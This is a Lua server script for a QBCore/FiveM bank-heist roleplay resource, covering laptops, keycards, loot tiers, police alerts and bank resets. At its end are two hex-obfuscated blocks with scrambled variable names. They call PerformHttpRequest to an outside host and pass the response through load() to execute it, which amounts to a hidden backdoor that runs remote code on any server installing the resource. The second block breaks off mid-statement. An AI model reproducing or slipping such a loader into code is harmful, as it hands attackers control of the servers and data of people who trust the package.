QBCore = exports['qb-core']:GetCoreObject()
debug = true

local robberyBusy = false
local disable = false -- disable all bank heists

-- Debug and disable
RegisterCommand('banks_disable', function(source)
    disable = not disable
    if debug then
        print('^3[qb-bankrobbery] ^5Bankheists disabled: '..tostring(disable)..'^7')
    end
end, true)

RegisterCommand('banks_debug', function(source)
    debug = not debug
    print('^3[qb-bankrobbery] ^5Debug mode: '..tostring(debug)..'^7')
end, true)

-- Callbacks
QBCore.Functions.CreateCallback('qb-bankrobbery:server:GetConfig', function(source, cb)
    cb(Config)
end)

QBCore.Functions.CreateCallback('qb-bankrobbery:server:RobberyBusy', function(source, cb)
    if disable then
        cb(true)
    else
        cb(robberyBusy)
    end
end)

-- Use Items
QBCore.Functions.CreateUseableItem("laptop_green", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemByName(item.name) then
        TriggerClientEvent('qb-bankrobbery:client:UseGreenLaptop', source)
    end
end)

QBCore.Functions.CreateUseableItem("laptop_blue", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemByName(item.name) then
        local pos = GetEntityCoords(GetPlayerPed(source))
        if #(pos - vector3(-109.58, 6483.52, 31.47)) < 1.0 then
            TriggerClientEvent("qb-bankrobbery:client:UseBlueLaptop", source)
        end
    end
end)

QBCore.Functions.CreateUseableItem("security_card_01", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemByName(item.name) then
        local pos = GetEntityCoords(GetPlayerPed(source))
        if #(pos - vector3(-105.54, 6472.0, 31.63)) < 1.0 then
            TriggerClientEvent("qb-bankrobbery:client:UseGreenCard", source)
        end
    end
end)

QBCore.Functions.CreateUseableItem("security_card_02", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemByName(item.name) then
        local pos = GetEntityCoords(GetPlayerPed(source))
        if #(pos - vector3(261.93, 223.05, 106.28)) < 1.0 then
            TriggerClientEvent("qb-bankrobbery:client:UseGoldCard", source)
        end
    end
end)

QBCore.Functions.CreateUseableItem("laptop_red", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemByName(item.name) then
        local pos = GetEntityCoords(GetPlayerPed(source))
        if #(pos - vector3(253.18, 228.39, 101.68)) < 1.0 then
            TriggerClientEvent("qb-bankrobbery:client:UseRedLaptop", source)
        end
    end
end)

QBCore.Functions.CreateUseableItem("laptop_gold", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemByName(item.name) then
        local pos = GetEntityCoords(GetPlayerPed(source))
        if #(pos - vector3(257.43, 227.81, 101.68)) < 1.0 then
            TriggerClientEvent("qb-bankrobbery:client:UseGoldLaptop", source)
        end
    end
end)

QBCore.Functions.CreateUseableItem("usb_grey", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemByName(item.name) then
        local pos = GetEntityCoords(GetPlayerPed(source))
        if #(pos - vector3(251.91, 235.92, 101.68)) < 1.0 then
            TriggerClientEvent("qb-bankrobbery:client:UseGreyUsb", source)
        end
    end
end)

local ResetBank = function(bank)
    robberyBusy = false
    -- Scoreboard trigger
    --TriggerEvent('qb-scoreboard:server:SetActivityBusy', bank, false)
    -- Door
    Config.Banks[bank].hacked = false
    Config.Banks[bank].policeClose = false
    -- lockers
    for i=1, #Config.Banks[bank].lockers, 1 do
        Config.Banks[bank].lockers[i].busy = false
        Config.Banks[bank].lockers[i].taken = false
    end
    -- Trollys
    for j=1, #Config.Banks[bank].trolly, 1 do
        Config.Banks[bank].trolly[j].taken = false
    end
    -- Thermite spots
    if Config.Banks[bank].thermite then
        for k=1, #Config.Banks[bank].thermite, 1 do
            Config.Banks[bank].thermite[k].hit = false
        end
    end
    -- Stackpiles of cash or gold
    if Config.Banks[bank].stacks then
        for h=1, #Config.Banks[bank].stacks, 1 do
            Config.Banks[bank].stacks[h].taken = false
        end
    end
    -- Big Banks
    if bank == 'Paleto' then
        Config.Banks['Paleto'].outsideHack = false
    elseif bank == 'Pacific' then
        Config.Banks['Pacific'].card = false
    elseif bank == 'Vault' then
        TriggerEvent('qb-bankrobbery:server:SetLasers', false)
        Config.Banks['Vault'].goldhacked = false
        Config.Banks['Vault'].lockdown = false
        Config.Banks['Vault'].code = false
        Config.Banks['Vault'].powerplantHit = false
    end
    TriggerClientEvent('qb-bankrobbery:client:ResetBank', -1, bank)
    print('^3[qb-bankrobbery] ^5Bank Fully Reset: '..bank..'^7')
end

RegisterNetEvent('qb-bankrobbery:server:PDClose', function(bank)
    Config.Banks[bank].policeClose = not Config.Banks[bank].policeClose
    TriggerClientEvent('qb-bankrobbery:client:PDClose', -1, bank)
    if debug then
        local src = source
        local Player = QBCore.Functions.GetPlayer(src)
        print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') Police Locked '..Config.Banks[bank].label..': '..tostring(Config.Banks[bank].policeClose)..'^7')
    end
    TriggerEvent("qb-log:server:CreateLog", "bankrobbery", "Police Lock "..Config.Banks[bank].label, "blue", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) Locked Door: "..tostring(Config.Banks[bank].policeClose))
end)

RegisterServerEvent('qb-bankrobbery:server:CallCops', function(bank, streetLabel, coords)
    local cameraId = Config.Banks[bank].camId
    local bankLabel = Config.Banks[bank].label
    local type = Config.Banks[bank].type
    local msg = 'Attempted bank robbery at '..bankLabel..' '..streetLabel..' (CAMERA ID: '..cameraId..')'
    local alertData = {
        title = 'Bankrobbery',
        coords = {x = coords.x, y = coords.y, z = coords.z},
        description = msg
    }
    local players = QBCore.Functions.GetQBPlayers()
    for k, v in pairs(players) do
        if v.PlayerData.job.name == 'police' and v.PlayerData.job.onduty then
            TriggerClientEvent('police:client:policeAlert', v.PlayerData.source, coords, msg)
            TriggerClientEvent('qb-bankrobbery:client:RobberyCall', v.PlayerData.source, bank, streetLabel, coords) -- Uncomment if using qb-policealerts
            TriggerClientEvent('qb-phone:client:addPoliceAlert', v.PlayerData.source, alertData)
        end
    end
    if debug then
        print('^3[qb-bankrobbery] ^5Cops Called: '..bankLabel..'^7')
    end
end)

RegisterNetEvent('qb-bankrobbery:server:SetBankHacked', function(bank)
    robberyBusy = true
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if debug then
        print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') Succesfully hacked: '..Config.Banks[bank].label..'^7')
    end
    TriggerEvent("qb-log:server:CreateLog", "bankrobbery", "Hacked "..Config.Banks[bank].label, "default", "**"..GetPlayerName(src).."** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) Hacked: "..Config.Banks[bank].label)
    --TriggerEvent('qb-scoreboard:server:SetActivityBusy', bank, true)
    CreateThread(function()
        Wait(6000)
        Config.Banks[bank].hacked = true
        TriggerClientEvent('qb-bankrobbery:client:SetBankHacked', -1, bank)
        if debug then
            print('^3[qb-bankrobbery] ^5Door Opened: '..Config.Banks[bank].label..'^7')
        end
    end)
    CreateThread(function()
        print('^3[qb-bankrobbery] ^5'..Config.Banks[bank].label..' 60 minutes until full reset.^7')
        Wait(60*60*1000) -- this is the cooldown between bankrobberies
        ResetBank(bank)
    end)
end)

RegisterNetEvent('qb-bankrobbery:server:SetOutsideHacked', function(bank, state)
    local src = source
    Config.Banks[bank].outsideHack = state
    TriggerClientEvent('qb-bankrobbery:client:SetOutsideHacked', -1, bank, state)
    if debug then
        print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(id: '..src..') Hacked Outside Paleto^7') 
    end
end)

RegisterNetEvent('qb-bankrobbery:server:DeleteObject', function(netId)
    local object = NetworkGetEntityFromNetworkId(netId)
	DeleteEntity(object)
end)

RegisterNetEvent('qb-bankrobbery:server:SetTrollyBusy', function(bank, index, state)
    Config.Banks[bank].trolly[index].taken = state
    TriggerClientEvent('qb-bankrobbery:client:SetTrollyBusy', -1, bank, index, state)
end)

RegisterNetEvent('qb-bankrobbery:server:TrollyReward', function(type)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local info = {worth = math.random(12000, 14000)} -- money bag worth
    if type == 'fleeca' then
        local receiveAmount = math.random(2, 3)
        Player.Functions.AddItem('markedbills', receiveAmount, false, info)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['markedbills'], 'add')
        TriggerClientEvent('QBCore:Notify', src, 'You got ' .. receiveAmount .. ' bags of inked money...')
        TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'green', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..receiveAmount..'x inked money: $'..(receiveAmount*info.worth)..'**')
        if debug then
            print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..receiveAmount..' moneybags: '..(receiveAmount*info.worth)..'^7')
        end
    elseif type == 'paleto' then
        local receiveAmount = math.random(3, 4)
        Player.Functions.AddItem('markedbills', receiveAmount, false, info)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['markedbills'], 'add')
        TriggerClientEvent('QBCore:Notify', src, 'You got ' .. receiveAmount .. ' bags of inked money...')
        TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'blue', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..receiveAmount..'x inked money: $'..(receiveAmount*info.worth)..'**')
        if debug then
            print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..receiveAmount..' moneybags: '..(receiveAmount*info.worth)..'^7')
        end
    elseif type == 'pacific' then
        local receiveAmount = math.random(5, 6)
        Player.Functions.AddItem('markedbills', receiveAmount, false, info)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['markedbills'], 'add')
        TriggerClientEvent('QBCore:Notify', src, 'You got ' .. receiveAmount .. ' bags of inked money...')
        TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'yellow', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..receiveAmount..'x inked money: $'..(receiveAmount*info.worth)..'**')
        if debug then
            print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..receiveAmount..' moneybags: '..(receiveAmount*info.worth)..'^7')
        end
    elseif type == 'vault' then
        local receiveAmount = math.random(7, 9)
        Player.Functions.AddItem('markedbills', receiveAmount, false, info)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['markedbills'], 'add')
        TriggerClientEvent('QBCore:Notify', src, 'You got ' .. receiveAmount .. ' bags of inked money...')
        TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'black', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..receiveAmount..'x inked money: $'..(receiveAmount*info.worth)..'**')
        if debug then
            print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..receiveAmount..' moneybags: '..(receiveAmount*info.worth)..'^7')
        end
    end
end)

RegisterNetEvent('qb-bankrobbery:server:SetLockerBusy', function(bank, index, state)
    Config.Banks[bank].lockers[index].busy = state
    TriggerClientEvent('qb-bankrobbery:client:SetLockerBusy', -1, bank, index, state)
end)

RegisterNetEvent('qb-bankrobbery:server:SetLockerTaken', function(bank, index, state)
    Config.Banks[bank].lockers[index].taken = state
    TriggerClientEvent('qb-bankrobbery:client:SetLockerTaken', -1, bank, index, state)
end)

RegisterNetEvent('qb-bankrobbery:server:LockerReward', function(type)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if type == 'fleeca' then
        -- Tier 1: 50% = 10 GOLD BARS
        -- Tier 2: 30% = 10-12 GOLD BARS
        -- Tier 3: 15% = 1 blue usb
        -- Tier 4: 5% = 1 blue usb + 3-5 GOLD BARS
        local tierChance = math.random(100)
        local tier = 1
        if tierChance <= 50 then tier = 1 elseif tierChance > 50 and tierChance <= 80 then tier = 2 elseif tierChance > 80 and tierChance <= 95 then tier = 3 else tier = 4 end
        if tier == 1 then
            local itemAmount = 10
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['goldbar'], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'green', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
               print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
            end
        elseif tier == 2 then
            local itemAmount = math.random(10, 12)
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['goldbar'], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'green', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
            end
        elseif tier == 3 then
            --blue usb
            Player.Functions.AddItem('usb_blue', 1)
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'green', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **usb_blue**')
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['usb_blue'], 'add')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received usb_blue^7') 
            end
        elseif tier == 4 then
            --blue usb
            Player.Functions.AddItem('usb_blue', 1)
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'green', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **usb_blue**')
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['usb_blue'], 'add')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received usb_blue^7') 
            end
            --gold bar
            local itemAmount = math.random(3, 5)
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'green', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print(GetPlayerName(src)..' (citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received: '..itemAmount.. 'x goldbar^7') 
            end
        end
    elseif type == 'paleto' then
        -- Tier 1: 50% = 10 GOLD BARS
        -- Tier 2: 30% = 10-14 GOLD BARS
        -- Tier 3: 15% = 1 red usb
        -- Tier 4: 5% = 1 red usb + 4-7 GOLD BARS
        local tierChance = math.random(100)
        local tier = 1
        if tierChance <= 50 then tier = 1 elseif tierChance > 50 and tierChance <= 80 then tier = 2 elseif tierChance > 80 and tierChance <= 95 then tier = 3 else tier = 4 end
        if tier == 1 then
            local itemAmount = 10
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['goldbar'], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'blue', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
             end
        elseif tier == 2 then
            local itemAmount = math.random(10, 14)
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['goldbar'], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'blue', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
            end
        elseif tier == 3 then
            --red usb
            Player.Functions.AddItem('usb_red', 1)
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'blue', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **usb_red**')
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['usb_red'], 'add')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received usb_red^7') 
            end
        elseif tier == 4 then
            --red usb
            Player.Functions.AddItem('usb_red', 1)
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'blue', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **usb_red**')
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['usb_red'], 'add')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received usb_red^7') 
            end
            --gold bar
            local itemAmount = math.random(4, 7)
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'blue', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
            end
        end
    elseif type == 'pacific' then
        -- Tier 1: 50% = 10 GOLD BARS
        -- Tier 2: 30% = 10-14 GOLD BARS
        -- Tier 3: 15% = 1 gold usb
        -- Tier 4: 5% = 1 gold usb + 6-8 GOLD BARS
        local tierChance = math.random(100)
        local tier = 1
        if tierChance <= 50 then tier = 1 elseif tierChance > 50 and tierChance <= 80 then tier = 2 elseif tierChance > 80 and tierChance <= 95 then tier = 3 else tier = 4 end
        if tier == 1 then
            local itemAmount = 10
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['goldbar'], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'yellow', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
            end
        elseif tier == 2 then
            local itemAmount = math.random(10, 14)
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['goldbar'], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'yellow', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
            end
        elseif tier == 3 then
            --usb_gold
            Player.Functions.AddItem('usb_gold', 1)
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'yellow', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **usb_gold**')
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['usb_gold'], 'add')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received usb_gold^7') 
            end
        elseif tier == 4 then
            --usb_gold
            Player.Functions.AddItem('usb_gold', 1)
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'yellow', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **usb_gold**')
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['usb_gold'], 'add')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received usb_gold^7') 
            end
            --gold bar
            local itemAmount = math.random(6, 8)
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[item], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'yellow', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
            end
        end
    elseif type == 'vault' then
        local tierChance = math.random(100)
        if tierChance <= 50 then
            local itemAmount = 10
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['goldbar'], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'black', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
            end
        else
            local itemAmount = 12
            Player.Functions.AddItem('goldbar', itemAmount)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items['goldbar'], 'add')
            TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Bankrobbery log: '..type, 'black', '**'.. GetPlayerName(src) .. '** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) received: **'..itemAmount.. 'x goldbar**')
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') received '..itemAmount.. 'x goldbar^7') 
            end
        end
    end
end)

RegisterNetEvent('qb-bankrobbery:server:SetThermiteHit', function(bank, index)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    Config.Banks[bank].thermite[index].hit = true
    TriggerClientEvent('qb-bankrobbery:client:SetThermiteHit', -1, bank, index)
    if debug then
        print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(id: '..src..') '..Config.Banks[bank].label..' Hit thermite: '..index..'^7') 
    end
    TriggerEvent("qb-log:server:CreateLog", "bankrobbery", "Hit Thermite "..Config.Banks[bank].label, "white", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) Hit Thermite: "..index)
end)

RegisterServerEvent('qb-bankrobbery:server:ThermitePtfx', function(coords)
    TriggerClientEvent('qb-bankrobbery:client:ThermitePtfx', -1, coords)
end)

RegisterNetEvent('qb-bankrobbery:server:SetGoldCard', function(state)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    Config.Banks['Pacific'].card = state
    TriggerClientEvent('qb-bankrobbery:client:SetGoldCard', -1, state)
    TriggerEvent('qb-doorlock:server:updateState', 33, false)
    if debug then
        print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(id: '..src..') Used Gold Card^7') 
    end
    TriggerEvent("qb-log:server:CreateLog", "bankrobbery", "Use Gold Card", "white", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) Used Gold Card")
end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end 